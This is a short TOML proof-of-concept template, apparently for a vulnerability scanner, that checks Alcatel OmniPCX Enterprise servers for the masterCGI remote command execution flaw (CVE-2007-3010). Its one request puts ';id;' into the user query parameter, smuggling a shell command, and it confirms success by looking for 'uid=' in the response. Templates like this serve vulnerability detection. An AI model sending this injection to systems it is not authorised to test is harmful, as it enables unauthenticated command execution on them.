[info]
id = "POC-AVE-2007-0002"
name = "Alcatel OmniPCX Enterprise masterCGI 远程命令执行 PoC"
author = "AVE"
severity = "critical"
tags = ["rce", "command-injection", "cgi"]
description = "Alcatel OmniPCX Enterprise Communication Server R7.1及之前版本的Unified Maintenance Tool中masterCGI脚本存在远程命令执行漏洞，未授权的攻击者可通过向/cgi-bin/masterCGI发送特制请求执行任意命令。"
vuln_id = ["CVE-2007-3010", "AVE-2007-0002"]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/masterCGI"
query.ping = "nomip"
query.user = ";id;"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["uid="]
expect = true
